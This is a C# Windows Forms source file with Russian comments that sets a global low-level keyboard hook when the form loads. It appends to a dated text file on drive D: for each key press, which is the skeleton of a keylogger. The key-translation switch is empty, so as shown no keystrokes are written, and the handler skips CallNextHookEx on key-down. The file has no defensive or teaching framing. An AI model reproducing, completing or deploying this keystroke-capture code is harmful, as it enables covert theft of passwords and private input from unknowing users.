using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp4
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            Load += Form1_Load;
            FormClosing += Form1_FormClosing;
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        // подключение библиотек
        // установка хука
        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callBack, IntPtr hinstance, uint threadId);

        //функция для снятия пользовательского хука
        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hinstance);
        //передача сообщения для цепочки 
        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, int wParam, IntPtr lParam);
        //Функция для загрузки библиотек
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);
        //Номер глобального LowLewel-хука на клавиатуру
        const int WH_KEYBOARD_LL = 13;
        //Сообщение нажатия на клавишу
        const int WM_KEYDOWN = 0x100;
        //Создаем callback делегат
        private LowLevelKeyboardProc _proc = hookProc;
        //Создаем hook и пресваеваем ему значение 0
        private static IntPtr hhook = IntPtr.Zero;
        private static IntPtr hookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            //обработка нажатия 
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string dt = $"{DateTime.Now.ToShortDateString()}";
                string fileName = $"D:\\some_{dt}.txt";
                if (!File.Exists(fileName))
                {
                    using (FileStream fs = File.Create(fileName)) { };
                }
                using (StreamWriter sw = new StreamWriter(fileName, append: true))
                {
                    //http://www.cambiaresearch.com/articles/15/javascript-char-codes-key-codes
                    //Раскладкой великобритании

                    switch (vkCode.ToString())
                    {

                    }
                    sw.Close();
                }
                return (IntPtr)0;
            }
            else
            {
                return CallNextHookEx(hhook, nCode, (int)wParam, lParam);
            }
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnHook();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            SetHook();
        }
        public void SetHook()
        {
            IntPtr hinstance = LoadLibrary("User32");
            hhook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hinstance, 0);
        }
        public static void UnHook()
        {
            UnhookWindowsHookEx(hhook);
        }
    }
}
